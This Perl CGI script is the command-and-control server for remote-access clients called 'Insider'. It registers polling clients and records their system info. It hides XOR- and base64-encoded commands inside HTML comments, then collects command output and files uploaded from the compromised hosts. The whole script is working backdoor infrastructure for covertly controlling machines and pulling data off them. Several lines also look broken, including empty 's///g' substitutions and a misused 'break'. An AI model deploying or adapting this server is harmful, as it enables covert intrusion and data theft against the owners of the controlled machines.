#!/usr/bin/perl
#
# cc.cgi -- example driver script for Insider clients
#
##################################################################

# Client directory
$basedir = "/var/www/html/clients/";

# Header and footer
$header = "/var/www/cgi-bin/header.txt";
$footer = "/var/www/cgi-bin/footer.txt";

# Command prefix - should be the same as clients
$prefix = "StartJavaScript=";

# Use content encoding? (0 = no, 1 = yes)
$encode = 1;

# Encoding password (use if $encode = 1)
$password = "MyPassword";

# Logfile
$logfile = "/var/www/html/clients/log";

# Alias file
$alias = "/var/www/html/clients/alias.txt";


##################################################################

use MIME::Base64;
use POSIX qw(strftime);
use File::Basename;
fileparse_set_fstype('MSWin32'); 

# If $basedir doesn't exist, create one
if (! -d $basedir) {
	mkdir $basedir;
}


# Date
$epoch = time;
$now = strftime "%a %b %e %H:%M:%S %Y", localtime;

# Break down the password string
@keydata = unpack('C*', $password);
$len = (length $password) - 1;

# Read stdin (http POST data) to variable
undef $/;
$content = <>;
$/ = "\n";


# Strip client and data
($client, $msg) = split (";", $content, 2);
chomp($msg);
$msg =~ s///g;
$clientdir = $basedir . $client;
$filedir = $basedir . $client . "/files";
$clientcmd = $basedir . $client . "/cmd";

# Print header
print "Content-type: text/html\n\n";

# Open alias file, if exists
if (open(FILE, "<", $alias)) {
	while (<FILE>) {
		chomp;
		# Skip comments and empty lines
		next if (/^#|^$/);
		($md5, $name) = split(":", $_, 2);
		if ($client eq $md5) {
			$client = $name;
			break;
		}
	}
	close (FILE);
}


# Log
if (!open(LOG, ">>", $logfile)) {
	exit 1;
}
print LOG $now . " client=" . $client . ", ";


# First time?
if (! -d $clientdir) {
	mkdir $clientdir;
	mkdir $filedir;
	# First packet should be info..
	$msg = decode_base64($msg);
	if ($encode) {
		$msg = xenc($msg);
	}
	chomp($msg);
	$msg =~ s///g;
	$file = $clientdir . "/info";
	if (open(FILE, ">", $file)) {
        	print FILE $msg;
                close(FILE);
	}
	$cmd = "";
	$msg = "";

# Nope, do we have command in queue?
} elsif (-e $clientcmd) {
	if (open(FILE, "<", $clientcmd)) {
		$content = <FILE>;	
                close(FILE);
	}
	chomp($content);
	print LOG "cmd=" . $content . ", ";
	if ($encode) {
		$content = xenc($content);
	}
	$content = encode_base64($content);
	chomp($content);
	$cmd = "<!-- " . $prefix . $content . " -->\n";
	unlink $clientcmd;
} else {
	$cmd = "";
}

# Print timestamp
$file = $clientdir . "/time";
if (open(FILE, ">", $file)) {
       	print FILE $epoch;
        close(FILE);
}

# Do we have results?
if ($msg) {
	# Base64-decode
	$msg = decode_base64($msg);

	# File download
	if ($msg =~ /^Upload;/) {
		($header, $name, $body) = split(";", $msg, 3);
		$file = $filedir . "/" . basename($name);
		chomp($body);
		if (open(FILE, ">", $file)) {
                        print FILE $body;
                 close(FILE);
                }

	# Normal command result
	} else {
		# Decode command result, if requested
		if ($encode) {
			$msg = xenc($msg);
		}
		$msg =~ s///g;
		$file = $clientdir . "/result";
		if (open(FILE, ">", $file)) {
        		print FILE $msg;
               	 close(FILE);
		}
	}
	print LOG "result=1";
} else {
	print LOG "result=0";
}


# Print the web page
if (open(FILE, "<", $header)) {
	while (<FILE>) {
		print $_;
	}
        close(FILE);
}
if ($cmd) {
	print $cmd;
}
if (open(FILE, "<", $footer)) {
	while (<FILE>) {
		print $_;
	}
        close(FILE);
}
print LOG "\n";
close (LOG);

# XOR encode/decode
sub xenc($@) {
        $buf = $_[0];
        @data = unpack('C*', $buf);
        $i = 0;
        foreach $char (@data) {
                if ( $i > $len ) {
                        $i = 0;
                }
                $char = $char ^ ($keydata[$i] + 128);
                $i = $i + 1;
        }
        $buf = pack('C*', @data);
        return $buf;
}

